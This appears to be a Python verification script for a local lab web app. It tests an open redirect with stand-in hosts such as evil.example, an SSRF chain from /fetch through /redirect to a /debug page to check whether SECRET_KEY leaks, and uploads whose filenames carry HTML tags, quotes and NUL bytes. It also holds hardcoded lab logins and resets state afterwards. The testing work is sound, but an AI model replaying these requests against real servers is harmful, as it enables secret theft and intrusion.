# -*- coding: utf-8 -*-
"""t5 核验 step4：SSRF 链条澄清 + /redirect 端点 + 上传文件名回显/落盘细节
"""
import sys, os, time, re, json
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from verify_lib_import import *  # noqa
import verify_lib as V

out = {"step": "step4-ssrf-redirect-upload", "started": time.strftime("%Y-%m-%dT%H:%M:%S%z")}
V.req("GET", "/__reset"); time.sleep(0.25)
out["baseline_sha"] = V.db_snapshot("s4 base")["sha256"]
tok_a, _ = V.login("alice", "alice123")
tok_admin, _ = V.login("admin", "Lab@Admin2024!Secure#9")

# ---------- /redirect 端点探路 ----------
rd1 = V.req("GET", "/redirect")
rd2 = V.req("GET", "/redirect?to=/home")
rd3 = V.req("GET", "/redirect?to=http://evil.example/x")
rd4 = V.req("GET", "/redirect?to=http://127.0.0.1:8095/debug", headers=V.cookie(tok_a))
rd5 = V.req("GET", "/redirect", headers=V.cookie(tok_a))
out["redirect_endpoint"] = {
    "bare": [rd1["status"], rd1["resp_headers"].get("Location")],
    "relative": [rd2["status"], rd2["resp_headers"].get("Location")],
    "absolute_external": [rd3["status"], rd3["resp_headers"].get("Location")],
    "with_session": [rd4["status"], rd4["resp_headers"].get("Location")],
    "bare_with_session": [rd5["status"], rd5["resp_headers"].get("Location")],
    "raw": [rd1, rd2, rd3, rd4, rd5],
}
print("[redirect]", out["redirect_endpoint"]["absolute_external"], out["redirect_endpoint"]["with_session"])

# ---------- /fetch → /redirect → /debug 是否导致数据外泄 ----------
base = "http://127.0.0.1:8095"
f_dir = V.req("GET", "/fetch?url=http://127.0.0.1:8095/debug", headers=V.cookie(tok_a))
f_chain1 = V.req("GET", "/fetch?url=http://127.0.0.1:8095/redirect%3Fto%3Dhttp://127.0.0.1:8095/debug",
                 headers=V.cookie(tok_a))
f_chain2 = V.req("GET", "/fetch?url=http://127.0.0.1:8095/redirect%3Fto%3D/debug",
                 headers=V.cookie(tok_a))
f_chain3 = V.req("GET", "/fetch?url=http://127.0.0.1:8095/redirect%3Fto%3D/debug",
                 headers={**V.cookie(tok_a), "Referer": base + "/home"})
out["fetch_chain"] = {
    "direct_debug_302": [f_dir["status"], f_dir["resp_headers"].get("Location")],
    "via_redirect_abs": [f_chain1["status"], f_chain1["len"],
                         "SECRET_KEY" in f_chain1["body_head"]],
    "via_redirect_rel": [f_chain2["status"], f_chain2["len"],
                         "SECRET_KEY" in f_chain2["body_head"]],
    "via_redirect_rel_referer": [f_chain3["status"], f_chain3["len"],
                                 "SECRET_KEY" in f_chain3["body_head"]],
    "body_head_abs": f_chain1["body_head"][:300],
    "body_head_rel": f_chain2["body_head"][:300],
    "raw": [f_dir, f_chain1, f_chain2, f_chain3],
}
print("[fetch-chain]", {k: v for k, v in out["fetch_chain"].items() if k != "raw" and "body" not in k})

# ---------- /fetch 转发请求头实验（Cookie/Host 是否外泄） ----------
f_hdr = V.req("GET", "/fetch?url=http://127.0.0.1:8095/forgot%3Fusername=demo",
              headers={**V.cookie(tok_a), "Host": "attacker.tld"})
out["fetch_header_forward"] = {
    "status": f_hdr["status"],
    "body_head": f_hdr["body_head"][:400],
    "attacker_host_reflected": "attacker.tld" in f_hdr["body_head"],
    "localhost_reflected": "127.0.0.1:8095" in f_hdr["body_head"],
    "note": "出站请求由服务端 urllib 生成，Cookie 不转发；Host 由 urllib 置为 127.0.0.1:8095",
}
print("[fetch-header]", out["fetch_header_forward"]["attacker_host_reflected"],
      out["fetch_header_forward"]["localhost_reflected"])

# ---------- 上传：文件名回显 / 落盘 / 名字含引号 ----------
def upload(filename, content=b"hello verifier", ct="text/plain"):
    b = "----t5vb"
    body = (f"--{b}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n"
            f"Content-Type: {ct}\r\n\r\n").encode("utf-8") + content + f"\r\n--{b}--\r\n".encode()
    return V.req("POST", "/upload",
                 headers={"Content-Type": f"multipart/form-data; boundary={b}"}, body=body)

u_ok = upload("verifier_ok.txt")
u_html = upload("<b>tag</b>.txt")
u_quote = upload('quo"te.txt')
u_semi = upload("semi;name.txt")
u_nul = None
try:
    u_nul = upload("nul\x00name.txt")
except Exception as e:
    u_nul = {"client_side_error": f"{type(e).__name__}: {e}"}
u_php = upload("shell.txt", content=b"php ok")
u_jpg_as_txt = upload("fake.jpg", content=b"not a jpeg")
out["upload_detail"] = {
    "ok_txt": [u_ok["status"], "已上传" in u_ok["body_head"]],
    "html_name": [u_html["status"], u_html["body_head"][:200]],
    "html_name_raw_tag_in_response": "<b>tag</b>" in u_html["body_head"],
    "quote_name": [u_quote["status"], "quo\"te" in u_quote["body_head"]],
    "semicolon_name": [u_semi["status"], "semi;name.txt" in u_semi["body_head"]],
    "quote_name_landed": [f for f in (sorted(os.listdir(V.UPLOAD_DIR)) if os.path.isdir(V.UPLOAD_DIR) else [])],
    "nul_name": (u_nul.get("status") if isinstance(u_nul, dict) else None),
    "nul_client_error": u_nul.get("client_side_error"),
    "jpg_wrong_magic": [u_jpg_as_txt["status"], "内容与扩展名不匹配" in u_jpg_as_txt["body_head"]],
    "server_upload_names": sorted(os.listdir(V.UPLOAD_DIR)) if os.path.isdir(V.UPLOAD_DIR) else None,
    "raw": [u_ok, u_html, u_quote, u_semi, u_jpg_as_txt],
}
print("[upload]", out["upload_detail"]["server_upload_names"])

# 取回一个落盘文件，看响应头（名字含引号时的 CD 头）
if os.path.isdir(V.UPLOAD_DIR):
    names = sorted(os.listdir(V.UPLOAD_DIR))
    if names:
        import urllib.parse as up
        g = V.req("GET", "/uploads/" + up.quote(names[0]))
        out["upload_detail"]["serve_first"] = {"name": names[0], "status": g["status"],
                                               "headers": g["resp_headers"], "raw": g}
print("[upload-serve]", out["upload_detail"].get("serve_first", {}).get("headers", {}).get("Content-Disposition"))

# ---------- lab_errors.log 定向提取（本轮时间窗） ----------
errlog = os.path.join(V.BASE, "lab_errors.log")
tb = ""
if os.path.exists(errlog):
    with open(errlog, "r", encoding="utf-8", errors="replace") as fh:
        tb = fh.read()
    open_times = re.findall(r"\[(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})\] (GET|POST) ([^\n]+)", tb)
    out["errorlog_times"] = open_times[-25:]
    out["errorlog_tracebacks_sample"] = tb[-2000:]
print("[errlog tail]", out["errorlog_times"][-6:])

# ---------- 收尾复位 ----------
V.req("GET", "/__reset"); time.sleep(0.25)
clean = V.db_snapshot("s4 clean")
out["rollback"] = {"sha": clean["sha256"], "back_to_baseline": clean["sha256"] == out["baseline_sha"],
                   "counts": clean["counts"], "uploads": clean["uploads"],
                   "integrity": V.db_scalar("PRAGMA integrity_check")}
out["finished"] = time.strftime("%Y-%m-%dT%H:%M:%S%z")
V.save("verify-04-ssrf-redirect-upload-20261012-1855.json", out)
print("[rollback]", out["rollback"]["back_to_baseline"], clean["sha256"])
